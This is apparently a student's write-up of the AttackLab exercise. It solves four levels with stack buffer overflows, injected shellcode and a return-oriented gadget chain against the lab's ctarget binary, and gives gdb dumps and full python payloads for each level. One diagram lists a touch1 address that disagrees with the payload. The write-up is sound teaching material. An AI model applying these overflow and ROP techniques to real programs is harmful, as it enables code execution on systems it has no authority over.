# AttackLab

## Level 1 (PART 1)

The goal is to overflow the buffer taken by the called function `Gets` so that we overwrite the return address of `getbuf()` and change it into `touch1`'s one. Let's try this out.

### Overflow Observation

First, open gdb and put a breakpoint right after the call to function `Gets`:
```
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017e6 <+0>:     sub    $0x38,%rsp
   0x00000000004017ea <+4>:     mov    %rsp,%rdi
   0x00000000004017ed <+7>:     call   0x401a2a <Gets>
   0x00000000004017f2 <+12>:    mov    $0x1,%eax
   0x00000000004017f7 <+17>:    add    $0x38,%rsp
   0x00000000004017fb <+21>:    ret
End of assembler dump.
(gdb) b*0x00000000004017f2
Breakpoint 1 at 0x4017f2: file buf.c, line 16.
```

Let's see what happen if we just give a string `"AAAAAAAAA"` to our program. At breakpoint 1 :
```
(gdb) x /10gx $rsp
0x5561e608:     0x4141414141414141      0x0000000000000041
0x5561e618:     0x0000000000000000      0x0000000000000000
0x5561e628:     0x0000000000000000      0x0000000000000000
0x5561e638:     0x0000000055586000      0x000000000040196e
0x5561e648:     0x0000000000000009      0x0000000000401e83
```
The letters A has been written in memory (they correspond to `41`'s). `0x40196e` represents an address that we can overwrite ! If we type too many A's, it could dangerous for this address. For that, I create a text file that contains many A's :
```
python -c "print('A'*60)" > sol1.txt
```
By running again the program in gdb with this new string (`r < sol1.txt`) and stop at breakpoint 1 :
```
(gdb) x /10gx $rsp
0x5561e608:     0x4141414141414141      0x4141414141414141
0x5561e618:     0x4141414141414141      0x4141414141414141
0x5561e628:     0x4141414141414141      0x4141414141414141
0x5561e638:     0x4141414141414141      0x0000000041414141
0x5561e648:     0x0000000000000009      0x0000000000401e83
```
The previous address `0x40196e` has been overwritten by A's.

### Exploitation

The previous address `0x40196e` looks like a return address (an instruction address once it gets out of `getbuf`) as it corresponds to `<test+14>`. Let's overwrite it with `touch1`'s one e.g with `0x4017fc` (this address can be found with gdb by disassembling the target function : `disas touch1` ). Now I can write the correct string :
```
python -c "print('A'*56 + '\xfc\x17\x40\x00\x00\x00\x00\x00')" > sol1.txt
```
Don't forget to reverse the byte order when writing addresses. And now, `./ctarget < sol1.txt` should work !

```
========= STRUCTURE OF THE INPUT BUFFER =============

|                        |         Return address        |
|       \x00...\x00      |           to touch1           |
|        (56 times)      |            0x401828           |
```

## Level 2 (PART 1)

The additional difficulty is about the argument that `touch2` takes as input and has to be validated by your cookie. The main idea is to use the previous method (Bufferoverflow) to inject an assembly code as if we were calling `touch2` and store our cookie as its argument. The first argument to a function is passed in register `%rdi`, in other words, let's execute :
```
movq $0x11560ebd,%rdi   # Pass my cookie (0x11560ebd) in register %rdi
retq                    # Return instruction
```
The next step is to transform this assembly code in an hexadecimal code. I write the previous assembly code in file called `transformhexa.s` and use the following terminal command to turn it into hexadecimal :
```
gcc -c transformhexa.s
objdump -d transformhexa.o  > transformhexa.d
```
The new generated file transformhexa.d should look like this :
```
transformhexa.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 bd 0e 56 11    mov    $0x11560ebd,%rdi
   7:   c3                      retq
```

In the level 1, we saw that the string we write in the `Gets` function is stored in `0x5561e608`. So the final step is to change the return address so that the next instructions to follow are the ones we just created e.g change `0x40196e` (`<test+14>`) into `0x5561e608` (our malicious instructions). Once our malicious instructions are executed, we need a second return address. As the stack pointer hasn't changed during the execution of our instructions, we have to add the address of `touch2` (`0x401828` accessible with `disas touch2`) right after `0x5561e608`. We can now generate our correct text file :
```
python -c "print('\x48\xc7\xc7\xbd\x0e\x56\x11\xc3' + '\x00'*48 + '\x08\xe6\x61\x55\x00\x00\x00\x00' +'\x28\x18\x40\x00\x00\x00\x00\x00')" > sol2.txt
```
```
========= STRUCTURE OF THE INPUT BUFFER =============

|     Malicious instructions      |                        |     First return address      |    Second return address     |
|   to store the cookie in %rdi   |       \x00...\x00      | to our malicious instructions |          to touch2           |
|                                 |        (48 times)      |          0x5561e608           |           0x401828           |
```


## Level 3 (PART 1)

First, notice that `touch3` takes a string as input which is simply a pointer (toward a character). So here, the register `%rdi` won't store my cookie itself but a pointer to our cookie. If my cookie is seen as a succession of characters, we can use the following table to find for each character its hexadecimal code (its coordinates):

![hct](img/hex_char_table.png)

My cookie turns from `(0x)11560ebd` (without the `0x` in bracket) to `\x31\x31\x35\x36\x30\x65\x62\x64`.

As we now have a global idea of what to do, we have to figure out where to store the cookie so that it is not overwritten by functions `hexmatch` and `strncmp`.

Level 3 is quite similar to level 2. As a naive person, let's store our cookie right after our malicious instructions which start at the memory address `0x5561e608` and are 8-bytes long. My cookie's address would be `0x5561e610 (= 0x5561e608 + 0x8)`. We can easily transform the following assembly code into an hexadecimal code (cf Level 2) :
```
movq $0x5561e610,%rdi   # Pass the pointer to my cookie in register %rdi
retq                    # Return instruction
```
In addition, the command `disas touch3` in gdb allows us to get access to the address of `touch3` : `0x4018fc`. Here is the string we'll entry to complete our tests (notice that I wrote `'\x41'*40` instead of `'\x00'*40` on purpose, we'll see it later) :
```
python -c "print('\x48\xc7\xc7\x10\xe6\x61\x55\xc3' + '\x31\x31\x35\x36\x30\x65\x62\x64' + '\x41'*40 + '\x08\xe6\x61\x55\x00\x00\x00\x00' +'\xfc\x18\x40\x00\x00\x00\x00\x00')" > sol3.txt
```

Noo wayy, what a surprise, we get wrong when executing `ctarget`. Our cookie was overwritten by the string `60ebd` :
```
(gdb) r < sol3.txt
Starting program: /users/eleves-a/2020/quentin.lao/Desktop/lab5/target5/ctarget < sol3.txt
Cookie: 0x11560ebd
Type string:Misfire: You called touch3("60ebd")
FAILED
[Inferior 1 (process 15568) exited normally]
```

To figure out what portion of memory is overwritten, we can compare the state of memory before entering `touch3` (by putting a breakpoint at the instruction ret of `getbuf` for instance) and right after the call the call of `hexmatch` :
```
# BREAKPOINT AT THE RET INSTRUCTION OF GETBUF                      # BREAKPOINT AFTER THE CALL OF HEXMATCH
(gdb) x /15gx $rsp - 56                                          | (gdb) x /15gx $rsp - 64
0x5561e608:     0xc35561e610c7c748      0x6462653036353131       | 0x5561e608:     0x353131e610c7c748      0x6462006462653036
0x5561e618:     0x4141414141414141      0x4141414141414141       | 0x5561e618:     0x4141414141414141      0x4141414141414141
0x5561e628:     0x4141414141414141      0x4141414141414141       | 0x5561e628:     0x000000005561e610      0x0000000055685fe8
0x5561e638:     0x4141414141414141      0x000000005561e608       | 0x5561e638:     0x0000000000000001      0x0000000000401918
0x5561e648:     0x00000000004018fc      0x0000000000401e00       | 0x5561e648:     0x0000000055586000      0x0000000000401e00
0x5561e658:     0x0000000000000000      0xf4f4f4f4f4f4f4f4       | 0x5561e658:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561e668:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4       | 0x5561e668:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x5561e678:     0xf4f4f4f4f4f4f4f4                               | 0x5561e678:     0xf4f4f4f4f4f4f4f4     

```
As we can see, the cookie has actually been overwritten by the string `\x36\x30\x65\x62\x64` (= `60ebd` converted in string). In addition, the use of `\x41`'s suggests that the 8 bytes from `0x5561e618` are not touched at all. Let's try this out :
```
========= STRUCTURE OF THE INPUT BUFFER =============

|        Malicious instructions       |                       |                        |                       |     First return address      |    Second return address     |
| to store the pointer cookie in %rdi |      \x00...\x00      |    The string cookie   |      \x00...\x00      | to our malicious instructions |          to touch3           |
|         to the cookie in %rdi       |       (8 times)       |                        |       (32 times)      |          0x5561e608           |           0x4018fc           |
```
```
python -c "print('\x48\xc7\xc7\x18\xe6\x61\x55\xc3' + '\x00'*8 + '\x31\x31\x35\x36\x30\x65\x62\x64' + '\x00'*32 + '\x08\xe6\x61\x55\x00\x00\x00\x00' +'\xfc\x18\x40\x00\x00\x00\x00\x00')" > sol3.txt
```
It works !


## Level 4 (PART 2)

Now, it is not possible to execute instructions contained in the input buffer anymore (NX protection). The idea is to use existing pieces of instructions (called gadgets) contained in the bunch of functions already present. Plus, these functions have fixed addresses for all executions whereas the stack doesn't (ASLR protection). By assembling these pieces of instructions, we will be able to achieve what we did in level 2 that is to say store the cookie in register `%rdi`.

There are probably many possible solutions. Here is the series of instructions I propose to execute after looking to the gadgets functions. Assume that the cookie is at the top of the stack :
```
pop   %eax        # Store the cookie in register %rax and increment %rsp by 8
mov   %eax,%edi   # Move the content of %rax to %rdi
```
The gadgets we will use are 1-line long, so the instructions above is actually the concatenation of 2 gadgets. To help us finding the gadget among the farm functions, we can use the following table that convert an instructions into an hexadecimal code :

![hit](img/hex_ins_table.png)

To execute our target instructions, 2 farm functions are interesting :
```
0000000000401990 <setval_137>:
  401990:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
  401996:       c3                      retq

...

000000000040199e <setval_123>:
  40199e:       c7 07 08 58 90 90       movl   $0x90905808,(%rdi)
  4019a4:       c3                      retq
```
In `setval_123`, `58 90 90` codes exactly for `pop   %eax` (with two `nop` instructions at the end but never mind). In `setval_127`, `89 c7 90` codes exactly for `mov   %eax,%edi` (also with a `nop` instruction at the end). Check this [nice website](https://defuse.ca/online-x86-assembler.htm) to convert hexadecimal code to assembly code.

So the idea is to overflow the input buffer to overwrite the first return address to `0x4019a1` (the address of `58 90 90`) to execute `pop   %eax`; make sure the cookie is at the top of the stack at this moment. Then, we need a second return address for the return instruction at the end of `setval_123`. This return address will be `0x401993` to execute `mov   %eax,%edi`. Finally, we use the return instruction of `setval_137` to get to `touch2`. To illustrate :
```
[   GETBUF   ]  --malicious return address (4019a1)--> [   SETVAL_123   ] --malicious return address (401993)--> [   SETVAL_137   ] --malicious return address--> [   TOUCH2   ]
```
During the execution above, the stack pointer is only incremented by 8 at each step (each time it reads a return address or pop the cookie), so all of our elements can be placed one after the other :
```
========= STRUCTURE OF THE INPUT BUFFER =============

|                                 |    First return address     |                 |    Second return address     |    Third return address     |
|       \x00\x00 ... \x00\x00     | to the middle of setval_123 |    The cookie   | to the middle of setval_137  |          to touch2          |
|            (56 times)           |           0x4019a1          |                 |           0x401993           |           0x401828          |
```
```
python -c "print('\x00'*56 + '\xa1\x19\x40\x00\x00\x00\x00\x00' + '\xbd\x0e\x56\x11\x00\x00\x00\x00' + '\x93\x19\x40\x00\x00\x00\x00\x00' +'\x28\x18\x40\x00\x00\x00\x00\x00')" > sol1b.txt
```
